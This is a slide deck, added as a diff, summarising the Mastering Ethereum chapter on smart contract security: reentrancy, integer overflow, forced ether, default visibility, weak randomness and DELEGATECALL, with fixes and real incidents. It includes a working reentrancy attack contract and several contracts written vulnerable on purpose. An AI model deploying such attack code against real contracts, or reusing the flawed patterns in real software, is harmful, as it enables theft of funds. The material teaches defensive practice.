@@ -1,5 +1,360 @@
 # Mastering Ethereum
 ## Chapter 9: Smart Contract Security (1/2)
 By [Alexis](https://github.com/alexis-l8)
+---
+
+Smart contracts are public, and any user can interact with them simply by creating a transaction.
+Any vulnerability can be exploited.
+---
+
+## Defensive programming
+- **Minimalism/simplicity**: Complexity is the enemy of security
+- **Code reuse**: Libraries, DRY principle
+- **Code quality**: smart contract programming !== general-purpose programming
+- **Readability/auditability**: write code that is well documented and easy to read
+- **Test coverage**
+---
+
+## Security Risks and Antipatterns
+1. Reentrancy
+2. Arithmetic Over/Underflows
+3. Unexpected Ether
+4. Default Visibilities
+5. Entropy Illusion
+6. DELEGATECALL
 
 ---
+
+## Reentrancy Attack
+---
+
+## Summary
+1. Vulnerable SC sends ether to external Malicious SC
+2. This external call is 'hijacked' by the Malicious SC's fallback function
+3. External malicious contract 'reenters' by calling a function on the vulnerable contract
+4. Vulnerable contract sends more ether to the Malicious SC
+5. Repeat until all ether in Vulnerable contract is drained
+---
+
+## EtherStore.sol
+
+```
+contract EtherStore {
+
+    uint256 public withdrawalLimit = 1 ether;
+    mapping(address => uint256) public lastWithdrawTime;
+    mapping(address => uint256) public balances;
+
+    function depositFunds() public payable {
+        balances[msg.sender] += msg.value;
+    }
+
+    function withdrawFunds (uint256 _weiToWithdraw) public {
+        require(balances[msg.sender] >= _weiToWithdraw);
+        // limit the withdrawal
+        require(_weiToWithdraw <= withdrawalLimit);
+        // limit the time allowed to withdraw
+        require(now >= lastWithdrawTime[msg.sender] + 1 weeks);
+----->  require(msg.sender.call.value(_weiToWithdraw)());
+        balances[msg.sender] -= _weiToWithdraw;
+        lastWithdrawTime[msg.sender] = now;
+    }
+ }
+```
+---
+
+## Attack.sol 1/2
+
+```
+import "EtherStore.sol";
+
+contract Attack {
+  EtherStore public etherStore;
+
+  // intialize the etherStore variable with the contract address
+  constructor(address _etherStoreAddress) {
+      etherStore = EtherStore(_etherStoreAddress);
+  }
+
+  function attackEtherStore() public payable {
+      // attack to the nearest ether
+      require(msg.value >= 1 ether);
+      // send eth to the depositFunds() function
+      etherStore.depositFunds.value(1 ether)();
+      // start the magic
+      etherStore.withdrawFunds(1 ether);
+  }
+
+  function collectEther() public {
+      msg.sender.transfer(this.balance);
+  }
+```
+---
+
+## Attack.sol 1/2
+
+```
+  // fallback function - where the magic happens
+  function () payable {
+      if (etherStore.balance > 1 ether) {
+          etherStore.withdrawFunds(1 ether);
+      }
+  }
+}
+```
+---
+
+## Preventative Techniques
+
+1. Use the built in **transfer function** when sending ether to external contracts (2300 gas limit)
+2. Checks-effects-interactions pattern: Ensure state changes happens before ether is sent out
+3. Mutex: lock the contract during code execution
+---
+
+## EtherStore.sol - FIXED
+
+```
+contract EtherStore {
+    bool reEntrancyMutex = false; // mutex
+    uint256 public withdrawalLimit = 1 ether;
+    mapping(address => uint256) public lastWithdrawTime;
+    mapping(address => uint256) public balances;
+
+    function depositFunds() public payable {
+        balances[msg.sender] += msg.value;
+    }
+
+    function withdrawFunds (uint256 _weiToWithdraw) public {
+        require(!reEntrancyMutex);
+        require(balances[msg.sender] >= _weiToWithdraw);
+        require(_weiToWithdraw <= withdrawalLimit);
+        require(now >= lastWithdrawTime[msg.sender] + 1 weeks);
+        balances[msg.sender] -= _weiToWithdraw;
+        lastWithdrawTime[msg.sender] = now;
+        reEntrancyMutex = true; // set reEntrancy mutex before external call
+        msg.sender.transfer(_weiToWithdraw);
+        reEntrancyMutex = false; // release mutex after external call
+    }
+ }
+```
+---
+
+## Real World Exameple: DAO
+
+- The DAO (Decentralized Autonomous Organization) attack was one of the major hacks that occurred in the early development of Ethereum
+- At the time, the contract held over $150 million
+- ultimately led to the hard fork that created Ethereum Classic (ETC)
+---
+
+## Arithmetic Over/Underflows Attack
+---
+
+## Summary
+- The Ethereum Virtual Machine specifies fixed-size data types for integers
+- Integer variables can represent only a certain range of numbers
+- **uint8**: can only store numbers in the range [0,255]
+- Fixed-size variables as being cyclic - start again from zero if we add numbers above the largest possible stored number
+- Solidity can be exploited if user input is unchecked and calculations are performed that result in numbers that lie outside the range of the data type that stores them
+---
+
+## Vulnerability
+- An over/underflow occurs when an operation is performed that requires a fixed-size variable to store a number (or piece of data) that is outside the range of the variable’s data type.
+- Underflow: Trying to assign a number below the range of the **uint8**. 0 - 1 = 255
+- Overflow: Adding numbers larger than the data type’s range. 0 + 257 = 1
+---
+
+## TimeLock.sol
+
+```
+contract TimeLock {
+
+    mapping(address => uint) public balances;
+    mapping(address => uint) public lockTime;
+
+    function deposit() public payable {
+        balances[msg.sender] += msg.value;
+        lockTime[msg.sender] = now + 1 weeks;
+    }
+
+    function increaseLockTime(uint _secondsToIncrease) public {
+        lockTime[msg.sender] += _secondsToIncrease;
+    }
+
+    function withdraw() public {
+        require(balances[msg.sender] > 0);
+        require(now > lockTime[msg.sender]);
+        balances[msg.sender] = 0;
+        msg.sender.transfer(balance);
+    }
+}
+```
+---
+
+## Ethernaut challenge
+
+```
+pragma solidity ^0.4.18;
+
+contract Token {
+
+  mapping(address => uint) balances;
+  uint public totalSupply;
+
+  function Token(uint _initialSupply) {
+    balances[msg.sender] = totalSupply = _initialSupply;
+  }
+
+  function transfer(address _to, uint _value) public returns (bool) {
+    require(balances[msg.sender] - _value >= 0);
+    balances[msg.sender] -= _value;
+    balances[_to] += _value;
+    return true;
+  }
+
+  function balanceOf(address _owner) public constant returns (uint balance) {
+    return balances[_owner];
+  }
+}
+```
+---
+
+## Preventative Techniques
+- Use or build mathematical libraries e.g. OpenZeppelin's SafeMath library
+- See fixed Timelock.sol contract with SafeMath Library [here](https://github.com/ethereumbook/ethereumbook/blob/develop/09smart-contracts-security.asciidoc#preventative-techniques-1)
+---
+
+# Real World Example: PoWHC
+- Proof of Weak Hands Coin (PoWHC) - lost 866 ether
+---
+
+## Unexpected Ether Attack
+---
+
+## Summary
+- Avoid using this.balance in your contracts as this can be forcibly manipulated
+---
+
+## Vulnerability
+- There are two ways in which ether can (forcibly) be sent to a contract without using a payable function or executing any code on the contract
+1. **Self-destruct/suicide**
+  - Any attacker can create a contract with a selfdestruct function, send ether to it, call selfdestruct(target) and force ether to be sent to a target contract.
+2. **Pre-sent ether**
+  - Contract addresses are deterministic.
+  - This means anyone can calculate what a contract’s address will be before it is created and send ether to that address. When the contract is created it will have a nonzero ether balance.
+---
+
+# [EtherGame.sol](https://github.com/ethereumbook/ethereumbook/blob/develop/09smart-contracts-security.asciidoc#unexpected-ether)
+## Example 5
+---
+
+## Preventative Techniques
+- Avoid using this.balance
+- If exact values of deposited ether are required, a self-defined variable should be used that is incremented in payable functions, to safely track the deposited ether. This variable will not be influenced by the forced ether sent via a selfdestruct call.
+---
+
+# [EtherGame.sol FIXED](https://github.com/ethereumbook/ethereumbook/blob/develop/09smart-contracts-security.asciidoc#unexpected-ether)
+## Example in Preventative Techniques
+---
+
+# Default Visibilities Attack
+---
+
+## Summary
+
+- Functions in Solidity have visibility specifiers that dictate how they can be called - external, public, internal or private
+- Functions default to public, allowing users to call them externally!
+- Issue arises when developers omit visibility specifiers on functions that should be private.
+---
+
+## Vulnerability
+
+```
+contract HashForEther {
+
+    function withdrawWinnings() {
+        // Winner if the last 8 hex characters of the address are 0
+        require(uint32(msg.sender) == 0);
+        _sendWinnings();
+     }
+
+     function _sendWinnings() { <-- PUBLIC BY DEFAULT
+         msg.sender.transfer(this.balance);
+     }
+}
+```
+---
+
+## Preventative Techniques
+
+- Always specify the visibility of all functions in a contract, even if they are intentionally public.
+---
+## Real-World Example: Parity Multisig Wallet (First Hack)
+
+- In the first Parity multisig hack, about $31M worth of Ether was stolen.
+---
+
+## Entropy Illusion Attack
+---
+
+## Summary
+- All transactions on the Ethereum blockchain are deterministic state transition operations.
+- Therefore there is no source of entropy or randomness in Ethereum.
+---
+
+## Vulnerability
+
+- Randomness must come from a source external to the blockchain.
+- Common pitfall is to use future block variables ie variables containing information about the transaction block whose values are not yet known: hashes, timestamps, block numbers, or gas limits
+- BUT these are controlled by the miner who mines the block, and as such are not truly random
+---
+
+## Attack Example
+
+A roulette smart contract with logic that returns a black number if the next block hash ends in an even number. A miner (or miner pool) could bet $1M on black. If they solve the next block and find the hash ends in an odd number, they could happily not publish their block and mine another, until they find a solution with the block hash being an even number (assuming the block reward and fees are less than $1M).
+---
+
+## Preventative Techniques
+
+- Do not use block variables as a source for entropy.
+- You could use a centralized entity that acts as a randomness oracle.
+- RANDAO contract - changing the trust model to a group of participants.
+---
+
+# Real-World Example: PRNG Contracts
+
+- PRNG = pseudorandom number generator.
+- An analysis in Feb 2018 found 43/3649 live contracts were vulnerable.
+---
+
+# DELEGATECALL ATTACK
+---
+
+## Summary
+
+- External message calls to contracts are handled by opodes. Useful for modularizing code.
+- This feature enables the implementation of libraries, allowing developers to deploy reusable code once and call it from future contracts.
+- `CALL`: code is run in the context of the external contract/function.
+- `DELEGATECALL`: code executed at the targeted address is run in the context of the calling contract.
+- `DELEGATECALL` can lead to unexpected code execution.
+---
+
+## Vulnerability
+
+- Code in libraries themselves can be secure and vulnerability-free.
+- But run in the context of another application new vulnerabilities can arise.
+- State or storage variables (variables that persist over individual transactions) are placed into slots sequentially as they are introduced in the contract.
+- Library contract: first variable, start, is stored in the contract’s storage at slot[0] (i.e., the first slot). The second variable, calculatedFibNumber, is placed in the next available storage slot, slot[1].
+---
+
+## Preventative Techniques
+
+- Solidity provides the library keyword for implementing library contracts
+- When using DELEGATECALL pay careful attention to the possible calling context of both the library contract and the calling contract
+---
+
+## Real-World Example: Parity Multisig Wallet (Second Hack)
+
+- The Second Parity Multisig Wallet hack is an example of how well-written library code can be exploited if run outside its intended context.
+
+
+
